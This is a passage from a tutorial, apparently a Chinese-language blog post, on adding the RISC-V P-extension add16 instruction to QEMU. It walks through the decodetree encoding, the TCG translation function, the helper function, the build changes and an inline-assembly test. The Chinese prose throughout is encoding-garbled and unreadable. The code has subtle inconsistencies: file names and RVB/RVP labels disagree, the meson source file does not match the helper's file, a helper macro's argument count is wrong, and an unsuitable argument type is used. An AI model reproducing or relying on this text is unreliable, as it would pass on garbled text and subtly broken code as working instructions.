å¹¶è‡ªè¡Œè¿›è¡Œç¼–è¯‘ï¼ŒQEMUæä¾›äº†ä¸¤ç§æ–¹å¼æ–¹ä¾¿æˆ‘ä»¬ä¸‹è½½ã€‚</p><p>é€šè¿‡ <code>git</code> çš„æ–¹å¼ä¸‹è½½ QEMU çš„<strong>æœ€æ–°</strong>æºç  - è¯¥æ–¹å¼å¯èƒ½éœ€è¦ä¸€ä¸ªç¨³å®šçš„ â€œç§‘å­¦çš„â€ ç½‘ç»œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/qemu-project/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git submodule init</span><br><span class="line">git submodule update --recursive</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€‰æ‹©ä¸‹è½½å®˜ç½‘æ‰“åŒ…å¥½çš„æœ€æ–°ç¨³å®šç‰ˆçš„QEMUæºç ï¼Œè¿™èƒ½è®©ä½ æ›´ç¨³å®šï¼Œå¿«é€Ÿçš„å¾—åˆ°ä»£ç ï¼Œä½†å¯èƒ½ä¸æ˜¯ git åŒæ­¥çš„æœ€æ–°ç‰ˆæœ¬ - <a href="https://download.qemu.org/qemu-5.2.0.tar.xz">QEMU-5.2.0</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-5.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-5.2.0.tar.xz</span><br><span class="line"><span class="built_in">cd</span> qemu-5.2.0</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸Šæ–¹å¼ä¸‹è½½è¿‡åï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹è¿›è¡ŒæŒ‡ä»¤çš„æ·»åŠ äº†</p><h3 id="æŒ‡ä»¤ç¼–ç -Decode-Tree"><a href="#æŒ‡ä»¤ç¼–ç -Decode-Tree" class="headerlink" title="æŒ‡ä»¤ç¼–ç  - Decode Tree"></a>æŒ‡ä»¤ç¼–ç  - Decode Tree</h3><p>ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…å’Œç¼–è¯‘æ£€æŸ¥ï¼ŒQEMU ä¸­çš„æŒ‡ä»¤çš„äºŒè¿›åˆ¶æŒ‡ä»¤ç¼–ç éƒ½æ˜¯ä»¥<code>Decode Tree</code> æ–¹å¼è¿›è¡Œå®šä¹‰çš„ï¼ŒQEMUçš„å†…éƒ¨ç¨‹åºåœ¨ç¼–è¯‘æ—¶ä¼šå°†å…¶è‡ªåŠ¨è§£æä¸º c è¯­è¨€ã€‚</p><p>ç‰¹åˆ«åœ°ï¼Œåƒ RISC-V è¿™ç§æ‹¥æœ‰å›ºå®šæŒ‡ä»¤æ ¼å¼çš„ ISA ç‰¹åˆ«å¥‘åˆ Decode Treeã€‚å› ä¸ºå„ä¸ªæŒ‡ä»¤æ®µéƒ½åœ¨å›ºå®šçš„ä½ç½®ã€‚å„ä¸ªæ®µçš„é‡å¤æ€§è¦é«˜å¾ˆå¤šï¼Œè¶³ä»¥èŠ‚çœå¾ˆå¤šä»£ç ç©ºé—´</p><p>ä¸‹é¢æˆ‘ä»¬å·²ä¸€ç§æœ€å¸¸ç”¨çš„ä¸‰å‚æ•°æŒ‡ä»¤çš„Pæ‰©å±•<code>add16</code>ä½œä¸ºä¾‹å­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ï¼target/riscv/insn*.decode</span></span><br><span class="line"><span class="comment">#        31:25   24:20 19:15 14:12 11:7  6:0</span></span><br><span class="line">add16    0100000 ..... ..... 000   ..... 1110111 @r</span><br><span class="line"><span class="comment">#        funct7  Rs2   Rs1  funct3  Rd   opcode</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># å…¶ä¸­ç”¨åˆ°çš„å„ä¸ªå®šä¹‰å¦‚ä¸‹</span><br><span class="line"># Formats <span class="number">32</span>:</span><br><span class="line">@r       ....... ..... ..... ...   ..... ....... &amp;r  %rs2 %rs1 %rd</span><br><span class="line"></span><br><span class="line"># Fields:</span><br><span class="line">%rs2       <span class="number">20</span>:<span class="number">5</span></span><br><span class="line">%rs1       <span class="number">15</span>:<span class="number">5</span></span><br><span class="line">%rd        <span class="number">7</span>:<span class="number">5</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæŒ‡ä»¤çš„å®šä¹‰æœ‰ä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹</p><ol><li>æ‰¾åˆ°å®˜æ–¹æ–‡ä»¶å¯¹äºæŒ‡ä»¤ç¼–ç çš„å®šä¹‰ï¼Œå°†æŒ‡ä»¤åç§°<code>add16</code>å’ŒäºŒè¿›åˆ¶ç¼–ç <code>0100000 ..... ..... 000   ..... 1110111</code>å¡«å…¥</li><li>é€šè¿‡æŒ‡ä»¤å¯¹äºå‚æ•°çš„å®šä¹‰ï¼Œé€‰å–åˆé€‚çš„<code>Format</code>ï¼Œä¾‹å¦‚ <code>@r</code> ï¼Œå°±é¡ºåºåŒ…å«äº†ä¸¤ä¸ªè¾“å…¥å¯„å­˜å™¨<code>rs1 &amp; rs2</code> å’Œè¾“å‡ºå¯„å­˜å™¨<code>rd</code></li><li>å¦‚æœæ²¡æœ‰ï¼Œå°±éœ€è¦è‡ªå·±å®šä¹‰</li></ol><p>æœ‰å…³decoder tree çš„å…·ä½“å†…å®¹ï¼Œæ¥ä¸‹æ¥çš„åšå®¢å¯èƒ½ä¼šè¿›è¡Œé˜è¿°ï¼Œ</p><p>ä½†æ˜¯æœ‰çš„ blogs å·²ç»æœ‰äº†è¯¦ç»†çš„é˜è¿°ï¼Œqemu å®˜æ–¹ä¹Ÿæœ‰ï¼Œä¸‹é¢ç»™å‡ºé“¾æ¥ï¼Œå¤§å®¶å¯ä»¥å‚é˜…</p><p>QEMUå®˜æ–¹ï¼š <a href="https://qemu.readthedocs.io/en/latest/devel/decodetree.html">Decode Treeçš„å®šä¹‰</a></p><p>å…¶ä»–åšå®¢çš„å®šä¹‰ï¼š<a href="https://0xc0de.tw/QEMU-Decodetree-%E8%AA%9E%E6%B3%95%E4%BB%8B%E7%B4%B9-Part-1/">Part-1</a>ï¼Œ<a href="https://0xc0de.tw/QEMU-Decodetree-%E8%AA%9E%E6%B3%95%E4%BB%8B%E7%B4%B9-Part-2/">Part-2</a></p><h3 id="æŒ‡ä»¤è½¬è¯‘-trans"><a href="#æŒ‡ä»¤è½¬è¯‘-trans" class="headerlink" title="æŒ‡ä»¤è½¬è¯‘ - trans"></a>æŒ‡ä»¤è½¬è¯‘ - trans</h3><p>QEMUåœ¨æ‰§è¡Œæ—¶ï¼Œä¼šå°† <code>target instructions</code>(e.g. RISC-V instructions) è½¬è¯‘æˆ <code>TCG ops</code>ï¼Œè€Œ<code>TCG ops</code>åˆ™ä¼šå†è½¬è¯‘ä¸º<code>host instructions</code>(e.g. x86 instruction)ã€‚è€Œ<code>trans_add16()</code> å®é™…æ‰§è¡Œäº† <code>add16</code> æŒ‡ä»¤å¯¹åº”çš„ <code>TCG ops</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ï¼ QEMU dynamic instructions translation</span></span><br><span class="line">+---------------------+      +---------+      +-------------------+</span><br><span class="line">| Target Instructions | ---&gt; | TCG ops | ---&gt; | Host instructions |</span><br><span class="line">+---------------------+      +---------+      +-------------------+</span><br><span class="line">     (e.g. RISC-V)                                  (e.g. x86)</span><br></pre></td></tr></table></figure><p>å…³äº <code>TCG</code> çš„è¯´æ˜ï¼Œå¯ä»¥å‚è€ƒ <code>QEMU</code> çš„ <code>documentations</code> <a href="https://github.com/qemu/qemu/blob/master/docs/devel/tcg.rst">Translator Internals</a>ï¼Œ<a href="https://github.com/qemu/qemu/blob/master/tcg/README">TCG Readme</a></p><p>ä¸ºäº†æ–¹ä¾¿å®šä¹‰å’ŒåŒºåˆ†ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶<code>./target/riscv/insn_trans/trans_rvp.inc.c</code>æ¥å®šä¹‰<code>P Extension</code>æŒ‡ä»¤çš„<code>trans_xx()</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#ï¼ ./target/riscv/insn_trans/trans_rvb.c.inc</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * RISC-V translation routines for the RVP Standard Extension.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">trans_add16</span><span class="params">(DisasContext *ctx, arg_pcnt *a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;rd != <span class="number">0</span>) &#123;</span><br><span class="line">        TCGv t0 = tcg_temp_new();</span><br><span class="line">        TCGv t1 = tcg_temp_new();</span><br><span class="line">        TCGv rt = tcg_temp_new();</span><br><span class="line">        </span><br><span class="line">        gen_get_gpr(t0, a-&gt;rs1);   </span><br><span class="line">        gen_get_gpr(t1, a-&gt;rs2);</span><br><span class="line">        </span><br><span class="line">        gen_helper_add16(rt, t0, t1);</span><br><span class="line">        </span><br><span class="line">        gen_set_gpr(a-&gt;rd, rt);</span><br><span class="line">        </span><br><span class="line">        tcg_temp_free(rt);</span><br><span class="line">        tcg_temp_free(t0);</span><br><span class="line">        tcg_temp_free(t1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå¯¹<code>x0</code>(<code>zero register</code>)çš„å†™å…¥éƒ½ä¼šè¢«å¿½ç•¥ï¼Œå› æ­¤é¦–å…ˆåˆ¤æ–­<code>rd</code>æ˜¯å¦ä¸º<strong>0</strong>ï¼Œè‹¥ä¸º<strong>0</strong>åˆ™ä¸åšä»»ä½•äº‹æƒ…</p><p>æ¥ç€å£°æ˜ä¸¤ä¸ªTCG variableï¼š<code>t0å’Œt1</code>ï¼Œåˆ©ç”¨<code>gen_get_gpr()</code>å°†<code>rs1,rs2</code>å¯„å­˜å™¨çš„å€¼å­˜å…¥å˜é‡</p><p>å£°æ˜ä¸€ä¸ªæ–°å˜é‡ <code>rt</code>  åˆ©ç”¨ <code>gen_set_gpr()</code> å°† ç»“æœå­˜å…¥ <code>rd</code> å¯„å­˜å™¨ä¸­</p><p>åˆ©ç”¨æ–°å£°æ˜çš„å˜é‡è°ƒç”¨<code>gen_helper_add16()</code>å‡½æ•°è½¬å‘<code>helper function</code>ï¼Œè¯¥å‡½æ•°è®¡ç®—å®Œæˆåï¼Œä¼šå°†ç»“æœä¿å­˜åœ¨<code>rd</code>(i.e. <code>cpu_gpr[a-&gt;rd]</code>)å¯„å­˜å™¨ä¸­ã€‚</p><p>P.S. å…¶å®è¿™é‡Œå¯ä»¥ç®€å•çš„ç›´æ¥å°†<code>cpu_gpr[a-&gt;rs1]</code>ä¼ å…¥ï¼Œçœç•¥TCG variable: <code>t0,t1</code> çš„å£°æ˜ï¼š</p><p><strong>æ³¨æ„ ï¼š è¯¥æ–¹æ³•ä¸æ¨èä½¿ç”¨ï¼Œæˆ‘ä»¬åœ¨æµ‹è¯•è¿‡ç¨‹å‘ç°è¿™æ ·å¯èƒ½å¯¼è‡´é”™è¯¯çš„äº§ç”Ÿ</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! ./target/riscv/insn_trans/trans_rvp.c.inc</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * RISC-V translation routines for the RVB Standard Extension.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">trans_add16</span><span class="params">(DisasContext *ctx, arg_pcnt *a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;rd != <span class="number">0</span>) &#123;</span><br><span class="line">        gen_helper_add16(cpu_gpr[a-&gt;rd], cpu_gpr[a-&gt;rs1], cpu_gpr[a-&gt;rs2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æŒ‡ä»¤çš„é€»è¾‘-helper-function"><a href="#æŒ‡ä»¤çš„é€»è¾‘-helper-function" class="headerlink" title="æŒ‡ä»¤çš„é€»è¾‘  - helper function"></a>æŒ‡ä»¤çš„é€»è¾‘  - helper function</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_HELPER_2(name, ret, t1, t2) \</span></span><br><span class="line">  DEF_HELPER_FLAGS_2(name, <span class="number">0</span>, ret, t1, t2)</span><br><span class="line"><span class="comment">//DEF_HELPER_FLAGS_2(name,flag,ret,t1,t2)</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿QEMUå¯¹äºhelper functionçš„è°ƒç”¨å’Œå®šä¹‰ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸€ä¸ªå‡½æ•°<code>DEF_HELPER_x = DEF_HELPER_FLAGS_x</code>  å¯¹QEMUå£°æ˜å‡½æ•°çš„åç§°å’Œå‚æ•°, <strong>x</strong>ä»£è¡¨è¯¥<strong>æŒ‡ä»¤éœ€è¦çš„å‚æ•°</strong>-(è‡ªå˜é‡ï¼‰ï¼Œä¸å¸¦ <code>_FLAGS</code> çš„å‡½æ•°ä¼šåˆ©ç”¨å‘½ä»¤è‡ªåŠ¨å°† <strong>FLAGS</strong>å‚æ•°ç½®ä¸º0ã€‚</p><ul><li><strong>name</strong> ï¼šæŒ‡ä»¤çš„åç§°ï¼Œè¿æ¥æˆ <code>HELPER(name) / helper_name</code> çš„å½¢å¼ä½œä¸º <strong>helper function</strong></li><li> <strong>flag</strong>    :  å‡½æ•°æƒé™ä½ï¼ŒTCGè°ƒç”¨çš„æƒé™ï¼Œå…¨å±€ä¸è¯»/å†™ï¼Œè¿”å›å€¼æ— ç”¨ï¼Œæ— è¿”å›å€¼ã€‚<code>tcg.h</code></li><li>  <strong>ret</strong>     :  <code>helper function</code>è¿”å›å€¼</li><li> <strong>t1- tn</strong> ï¼š<code>helper function</code>çš„å‚æ•°</li></ul><p>ret å’Œ t1-tn çš„ç±»å‹å¯ä»¥æ˜¯ï¼Œ</p><table><thead><tr><th>ç±»å‹</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td>tl</td><td>target_ulong - QEMUä¸­ä¿å­˜å¯„å­˜å™¨å€¼å¾—åŸºæœ¬å•ä½</td></tr><tr><td>env</td><td>environment - CPUXXSTATE ä¿å­˜CPUçŠ¶æ€å¯„å­˜å™¨çš„å€¼</td></tr><tr><td>i64</td><td>integer-64 - 64ä½æ•´å‹å¯ç”¨äºæµ®ç‚¹æ•°æŒ‡ä»¤</td></tr></tbody></table><p><code>add16</code>çš„ helper function å®šä¹‰å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#! ./target/riscv/helper.h</span><br><span class="line"><span class="comment">/* Packed-SIMD Extension */</span></span><br><span class="line">DEF_HELPER_2(add16, tl, tl, tl)</span><br><span class="line">DEF_HELPER_FLAGS_3(add16, <span class="number">0</span>, tl, tl, tl)</span><br></pre></td></tr></table></figure><p>ä¸¤ç§å®šä¹‰æ„ä¹‰ç›¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#! ./target/riscv/bitmanip_helper.c</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * RISC-V P Extension Helpers for QEMU.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cpu.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exec/exec-all.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exec/helper-proto.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> u16p uint16_t *</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(TARGET_RISCV32)</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint32_t</span> LC_16BIT = <span class="number">2</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint32_t</span> LC_16BIT = <span class="number">4</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// target_ulong HELPER(add16)(target_ulong rs1, target_ulong rs2) </span></span><br><span class="line"><span class="function">target_ulong <span class="title">helper_add16</span> <span class="params">(target_ulong rs1, target_ulong rs2)</span> </span>&#123;</span><br><span class="line">    target_ulong rd = <span class="number">0</span>;</span><br><span class="line">    u16p rs1_p = (u16p)&amp;rs1;</span><br><span class="line">    u16p rs2_p = (u16p)&amp;rs2;</span><br><span class="line">    u16p rd_p  = (u16p)&amp;rd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; LC_16BIT; i++)</span><br><span class="line">        rd_p[i] = rs1_p[i] + rs2_p[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å°±æ˜¯<code>add16</code>çš„å®é™…é€»è¾‘å‡½æ•°ï¼Œ<code>helper function</code> æ¥å—ä¸¤ä¸ª <code>target_ulong</code> ç±»å‹çš„ <code>rs1&amp;rs2</code>, å¹¶å°†ç»“æœè¿”å›ï¼Œå­˜å‚¨åœ¨ <code>rd</code> å¯„å­˜å™¨</p><p><code>add16</code> æŒ‡ä»¤çš„å†…å®¹ï¼Œæ˜¯å°†å¯„å­˜å™¨åˆ†ä¸ºå¤šä¸ª<strong>16</strong>ä½æ•°å¹¶åˆ†åˆ«è®¡ç®—ï¼Œå› æ­¤æˆ‘ä»¬å°†<code>rs1/2</code> å˜ä¸º<strong>16</strong>ä½çš„æ•°ç»„(æŒ‡é’ˆ)å¹¶åˆ†åˆ«è¿›è¡ŒåŠ æ³•è¿ç®—ï¼Œå¾—åˆ°ç»“æœç„¶åè¿”å›ã€‚</p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>ä¸ºäº†ä½¿æŒ‡ä»¤æˆåŠŸæ‰§è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¡«å†™ä»¥ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#! ./target/riscv/meson.build</span><br><span class="line">riscv_ss.add(files(</span><br><span class="line">  &#x27;psimd_helper.c&#x27;,</span><br><span class="line">))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#! ./target/riscv/translate.c</span><br><span class="line"><span class="comment">/* Include insn module translation function */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;insn_trans/trans_rvp.c.inc&quot;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æŒ‡ä»¤çš„æµ‹è¯•"><a href="#æŒ‡ä»¤çš„æµ‹è¯•" class="headerlink" title="æŒ‡ä»¤çš„æµ‹è¯•"></a>æŒ‡ä»¤çš„æµ‹è¯•</h3><p>åœ¨æˆ‘ä»¬äº†è§£äº†æŒ‡ä»¤çš„æ·»åŠ æµç¨‹åï¼Œæˆ‘ä»¬è¦å¯¹æ·»åŠ åçš„æŒ‡ä»¤è¿›è¡Œæµ‹è¯•ä»¥ç¡®ä¿æŒ‡ä»¤çš„æ­£ç¡®æ€§ã€‚</p><p>ä¸ºäº†æˆåŠŸç¼–è¯‘ï¼Œä½ éœ€è¦äº‹å…ˆå®‰è£…<code>riscv64-unknown-elf-gcc</code>æ¥ç¼–è¯‘æµ‹è¯•ç¨‹åºï¼Œä½ å¯ä»¥é€šè¿‡  <a href="https://github.com/riscv/riscv-gnu-toolchain">riscv-gnu-toolchain</a> è¿›è¡Œç¼–è¯‘å®‰è£…</p><p>ä¸‹é¢æˆ‘å°†ä»‹ç»ä¸€ä¸‹QEMUçš„ç¼–è¯‘è¿‡ç¨‹ï¼Œé‰´äºæˆ‘ä»¬åªéœ€è¦QEMUçš„ç”¨æˆ·æ€æµ‹è¯•ç¨‹åºï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åœ¨ä½ ä¿å­˜qemuçš„æ–‡ä»¶å¤¹ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">../configure --target-list=riscv64-linux-user</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><code>build</code> æ–‡ä»¶å¤¹ç”¨äºä¿å­˜ä½ çš„ç¼–è¯‘ç»“æœï¼Œä½ ä¹Ÿå¯ä»¥è‡ªç”±é€‰æ‹©æƒ³è¦ä¿å­˜çš„æ–‡ä»¶å¤¹ã€‚</p><p>æ¥ç€æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>p_test</code> æ–‡ä»¶å¤¹ä¿å­˜æµ‹è¯•ç¨‹åºå¹¶è¿›è¡Œæµ‹è¯•, å› ä¸ºåŸæœ‰çš„å·¥å…·é“¾å¹¶ä¸å«æœ‰æ–°æ·»åŠ çš„æŒ‡ä»¤ï¼Œæ²¡åŠæ³•ç¼–è¯‘æˆåˆé€‚çš„äºŒè¿›åˆ¶ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å†…è”æ±‡ç¼–ä¸ºå…¶æä¾›äºŒè¿›åˆ¶ç¼–ç ï¼Œçœå»æ›´æ”¹å·¥å…·é“¾çš„éº»çƒ¦ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#! ./build/p_test/add16.c</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((noinline))</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mac_asm</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">asm</span> __volatile__ (<span class="string">&quot;.word 0x40c58577\n&quot;</span>);</span><br><span class="line">        <span class="keyword">asm</span> __volatile__ (<span class="string">&quot;mv  %0,a0\n&quot;</span></span><br><span class="line">                : <span class="string">&quot;=r&quot;</span>(a)</span><br><span class="line">                :</span><br><span class="line">                :);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;a=%d\n&quot;</span>,a);</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">5</span>,b=<span class="number">0xFFFEFFFF</span>,c=<span class="number">0xFFFEFFFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;add16:=0x%x\n  add:=0x%x\n&quot;</span>,mac_asm(a,b,c),b+c);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>RISC-V</code> ä¼šå°†å‡½æ•°çš„å‚æ•°æ”¾å…¥ <code>a0-a7</code> å¯„å­˜å™¨ä¸­ï¼Œå¹¶å°† <code>a0</code> å¯„å­˜å™¨ä¸­çš„å€¼è¿”å›</p><img src="https://raw.githubusercontent.com/dingiso/dingiso.github.io/main/img/reg_table.png"><p><code>a0-a7</code>  å¯¹åº” <code>x10-x17</code> å’ŒäºŒè¿›åˆ¶ç¼–ç  <code>10-17</code> ï¼Œ å› æ­¤æœ€åçš„æŒ‡ä»¤ç¼–ç å¦‚ä¸‹</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Encoding used for &quot;add16 a0, a1, a2&quot;</span></span><br><span class="line"><span class="number">0x40c58577</span> [base <span class="number">16</span>]</span><br><span class="line">==</span><br><span class="line"><span class="comment"># Group by related bit chunks:</span></span><br><span class="line"><span class="number">0100000</span> <span class="number">01100</span> <span class="number">01011</span> <span class="number">000</span> <span class="number">01010</span> <span class="number">1110111</span> [base <span class="number">2</span>]</span><br><span class="line">^       ^     ^     ^   ^     ^</span><br><span class="line"><span class="params">|       |</span>     <span class="params">|     |</span>   <span class="params">|     |</span></span><br><span class="line"><span class="params">|       |</span>     <span class="params">|     |</span>   <span class="params">|     opcode (6..2=0x1D 1..0=3)</span></span><br><span class="line"><span class="params">|</span>       <span class="params">|     |</span>     <span class="params">|   dest (10 : a0)</span></span><br><span class="line"><span class="params">|</span>       <span class="params">|     |</span>     funct3 (<span class="number">14</span>..<span class="number">12</span>=<span class="number">0</span>)</span><br><span class="line"><span class="params">|       |</span>     src1 (<span class="number">11</span> : a1)</span><br><span class="line"><span class="params">|       src2 (12 : a2)</span></span><br><span class="line"><span class="params">funct7 (31..25=0x40)</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†é˜²æ­¢åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨ä¼šå¯¹å¯„å­˜å™¨è¿›è¡Œä¼˜åŒ–ï¼Œå°†è¿”å›å€¼å­˜å…¥å…¶ä»–å¯„å­˜å™¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>mv</code> 